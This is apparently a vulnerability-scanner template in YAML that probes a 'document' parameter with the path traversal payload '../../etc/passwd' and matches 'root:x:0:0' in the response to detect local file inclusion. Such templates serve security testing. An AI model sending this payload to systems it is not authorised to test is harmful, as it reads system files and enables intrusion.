id: lfi7-221
name: 'Deep traversal in document'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via document'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      document:
        - '../../etc/passwd'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
